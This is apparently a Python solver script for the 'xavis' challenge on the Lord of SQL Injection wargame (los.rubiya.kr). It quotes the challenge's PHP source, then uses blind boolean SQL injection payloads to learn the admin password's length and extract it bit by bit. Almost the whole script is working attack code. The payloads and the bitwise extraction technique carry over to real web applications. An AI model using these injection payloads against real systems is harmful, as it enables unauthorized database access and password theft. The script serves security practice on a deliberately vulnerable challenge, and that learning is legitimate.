#!/usr/bin/env python3
import los


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'Hello admin' in args[0]


def main():
    '''
    Xavis

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 

    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
    '''

    url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
    cook = los.check_cookies(url)

    payload = "'||length(pw)>%s#"
    param = dict(pw=payload)
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    # Unicode len 32 bit
    unicode_len_bit = 32
    result = ''

    payload = "'||mid(lpad(bin(ord(mid(pw,%s,1))),%s,0),%s,1)=1#"
    param = dict(pw=payload)
    result = los.find_pass_over_bits(url, param, len_of_key, check_func,
                                     cook, unicode_len_bit)

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Xavis Clear!')


if __name__ == '__main__':
    main()
